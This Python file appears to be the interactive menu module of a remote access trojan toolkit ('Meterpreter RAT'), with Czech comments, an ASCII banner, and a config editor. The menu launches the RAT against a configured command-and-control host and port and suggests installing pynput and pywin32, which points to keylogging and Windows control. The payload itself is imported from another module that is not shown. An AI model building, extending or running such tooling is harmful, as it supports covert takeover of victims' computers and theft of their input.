# rat/menu.py
import time
from colorama import Fore

from rat.config import load_rat_config, save_rat_config, DEFAULTS
from rat.meterpreter import MeterpreterRAT


def rat_menu():
    """Submenu pro RAT. Vraci se do hlavniho menu po 'back'."""
    config = load_rat_config()

    while True:
        _print_header(config)
        choice = input(Fore.MAGENTA + "\nM0L€/Meterpreter> " + Fore.RESET).strip().lower()

        if choice in ("1", "start"):
            _run_rat(config)
            return
        if choice in ("2", "config", "configure"):
            config = _edit_config(config)
            continue
        if choice in ("3", "back", "q", "exit"):
            return
        print(Fore.RED + "Neplatna volba (1/2/3)")


def _print_header(config):
    print(Fore.YELLOW + r"""
 _________ .__               .___  .___
 \_   ___ \|  |__   ____   __| _/__| _/____   _______
 /    \  \/|  |  \_/ __ \ / __ |/ __ |\__  \  \_  __ \
 \     \___|   Y  \  ___// /_/ / /_/ | / __ \_ |  | \/
  \______  /___|  /\___  >____ \____ |(____  / |__|
         \/     \/     \/     \/    \/     \/
""")
    print(Fore.CYAN + "Current configuration:")
    for k, v in config.items():
        print(Fore.WHITE + f"  {k:<20} = {Fore.GREEN}{v}")

    print(Fore.YELLOW + "\nOptions:")
    print(Fore.CYAN + "  1. Start Meterpreter RAT")
    print(Fore.CYAN + "  2. Configure settings")
    print(Fore.CYAN + "  3. Back to main menu")


def _run_rat(config):
    print(Fore.GREEN + "[+] Starting Meterpreter RAT...")
    print(Fore.YELLOW + f"[*] Connecting to {config['c2_host']}:{config['c2_port']}")
    print(Fore.YELLOW + "[*] Ctrl+C to stop")
    print(Fore.YELLOW + "[*] Optional deps: pip install pynput pywin32")

    rat = MeterpreterRAT(config)
    try:
        rat.run()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] RAT stopped by user")
    except Exception as e:
        print(Fore.RED + f"[!] RAT error: {e}")

    # rat.run() uz zavrel socket; jen pockej na Enter
    if rat.running:
        input("\nPress Enter to continue...")


def _edit_config(config):
    """Interaktivni editor. 'q' = zpet bez ulozeni, 's' = ulozit a zpet."""
    print(Fore.CYAN + "\nEdit configuration (Enter = keep, 'q' = cancel, 's' = save):\n")

    edited = dict(config)
    for key in list(edited.keys()):
        current = edited[key]
        raw = input(f"  {key} [{current}]: ").strip().lower()

        if raw == "q":
            print(Fore.YELLOW + "[!] Zmeny zahozeny")
            return config
        if raw == "s":
            break
        if raw == "":
            continue

        parsed = _parse_value(current, raw)
        if parsed is None:
            print(Fore.RED + f"  Neplatna hodnota, zustava {current}")
            continue
        edited[key] = parsed

    save_rat_config(edited)
    print(Fore.GREEN + "[+] Configuration saved")
    time.sleep(1)
    return edited


def _parse_value(current, raw):
    """Prevede raw string na typ podle current. Vrati None pri chybe."""
    if isinstance(current, bool):
        if raw in ("true", "1", "yes", "y", "on"):
            return True
        if raw in ("false", "0", "no", "n", "off"):
            return False
        return None
    if isinstance(current, int):
        try:
            return int(raw)
        except ValueError:
            return None
    return raw